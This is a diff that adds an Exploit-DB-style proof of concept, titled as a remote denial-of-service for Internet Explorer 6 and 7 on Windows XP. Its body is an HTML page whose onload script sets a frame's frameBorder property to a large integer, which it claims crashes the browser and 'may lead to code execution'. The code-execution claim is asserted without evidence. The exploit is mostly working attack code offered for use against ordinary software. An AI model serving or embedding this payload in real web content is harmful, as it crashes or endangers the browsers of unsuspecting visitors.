@@ -1,0 +1,30 @@
+# Exploit Title: IE6 / 7 Remote Dos vulnerability
+# Date: 27/07/2010
+# Author: Richard leahy
+# Version: 6 / 7
+# Tested on: Windows Xp Sp3
+#category Remote Dos, might lead to code execution.
+ 
+# The vulnerability is caused due to specifying a large value integer or string to the frame.frameBorder    
+causing a dos and may lead to code execution.
+ 
+#code
+ 
+&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+ 
+function dos(){
+ 
+  var e = document.createElement(&#039;frame&#039;);
+  var prop = &#039;frameBorder&#039;;
+ 
+  e[prop] = 0123456789;
+}
+ 
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload=&quot;dos()&quot;&gt;
+&lt;/body&gt;
+ 
+&lt;/html&gt;
